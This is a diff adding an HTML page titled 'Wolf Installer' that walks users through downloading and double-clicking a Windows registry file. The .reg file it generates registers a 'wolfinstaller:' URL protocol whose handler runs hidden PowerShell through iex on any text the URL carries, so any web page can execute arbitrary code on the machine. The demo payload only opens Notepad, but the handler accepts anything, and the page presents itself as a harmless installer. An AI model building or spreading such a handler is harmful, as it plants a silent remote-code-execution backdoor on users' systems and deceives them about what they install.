@@ -1,0 +1,145 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Wolf Installer</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #e9ecef;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+    }
+    .installer-container {
+      background-color: #fff;
+      border-radius: 10px;
+      box-shadow: 0 0 20px rgba(0, 0, 0, 0.1);
+      width: 500px;
+      padding: 30px;
+      text-align: center;
+    }
+    h1 {
+      font-size: 28px;
+      margin-bottom: 20px;
+      color: #333;
+    }
+    p {
+      font-size: 16px;
+      color: #666;
+      margin-bottom: 30px;
+    }
+    .step {
+      margin-bottom: 20px;
+    }
+    .step h2 {
+      font-size: 20px;
+      color: #007BFF;
+      margin-bottom: 10px;
+    }
+    button {
+      display: inline-block;
+      width: 200px;
+      padding: 10px;
+      margin: 10px;
+      border: none;
+      border-radius: 5px;
+      font-size: 16px;
+      cursor: pointer;
+      background-color: #007BFF;
+      color: #fff;
+      transition: background-color 0.3s ease;
+    }
+    button:hover {
+      background-color: #0056b3;
+    }
+    button:disabled {
+      background-color: #cccccc;
+      cursor: not-allowed;
+    }
+    .hidden {
+      display: none;
+    }
+  </style>
+</head>
+<body>
+  <div class="installer-container">
+    <h1>Wolf Installer</h1>
+    <p>Follow the steps below to install and run the script.</p>
+    
+    <div class="step">
+      <h2>Step 1: Download Registry File</h2>
+      <button id="download-reg-btn">Download Registry File</button>
+    </div>
+
+    <div class="step">
+      <h2>Step 2: Install Registry File</h2>
+      <p>Double-click the downloaded file to add the protocol handler to your registry.</p>
+    </div>
+
+    <div class="step">
+      <h2>Step 3: Verify Installation</h2>
+      <button id="check-protocol-btn">Check Protocol</button>
+    </div>
+
+    <div class="step hidden" id="run-script-step">
+      <h2>Step 4: Run Script</h2>
+      <button id="run-script-btn">Run Script</button>
+    </div>
+  </div>
+
+  <script>
+    // Function to create and download the registry file
+    document.getElementById('download-reg-btn').addEventListener('click', function() {
+      const regContent = `
+      Windows Registry Editor Version 5.00
+
+      [HKEY_CLASSES_ROOT\\wolfinstaller]
+      @="URL:Wolf Installer Protocol"
+      "URL Protocol"=""
+
+      [HKEY_CLASSES_ROOT\\wolfinstaller\\shell]
+
+      [HKEY_CLASSES_ROOT\\wolfinstaller\\shell\\open]
+
+      [HKEY_CLASSES_ROOT\\wolfinstaller\\shell\\open\\command]
+      @="powershell.exe -WindowStyle Hidden -Command \"iex ([string]([System.Uri]::UnescapeDataString('%1') -replace 'wolfinstaller:'))\""
+      `;
+      const blob = new Blob([regContent], { type: 'application/octet-stream' });
+      const link = document.createElement('a');
+      link.href = URL.createObjectURL(blob);
+      link.download = 'wolfinstaller.reg';
+      document.body.appendChild(link);
+      link.click();
+      document.body.removeChild(link);
+    });
+
+    // Function to check if the protocol is installed
+    document.getElementById('check-protocol-btn').addEventListener('click', function() {
+      try {
+        const testUrl = 'wolfinstaller:test';
+        const iframe = document.createElement('iframe');
+        iframe.style.display = 'none';
+        iframe.src = testUrl;
+        document.body.appendChild(iframe);
+        setTimeout(() => {
+          document.body.removeChild(iframe);
+          document.getElementById('run-script-step').classList.remove('hidden');
+          alert('Protocol is installed. You can now run the script.');
+        }, 1000);
+      } catch (e) {
+        alert('Protocol is not installed. Please install the registry file and try again.');
+      }
+    });
+
+    // Function to run the script
+    document.getElementById('run-script-btn').addEventListener('click', function() {
+      const command = 'start notepad.exe';
+      const encodedCommand = encodeURIComponent(command);
+      window.location.href = `wolfinstaller:${encodedCommand}`;
+    });
+  </script>
+</body>
+</html>
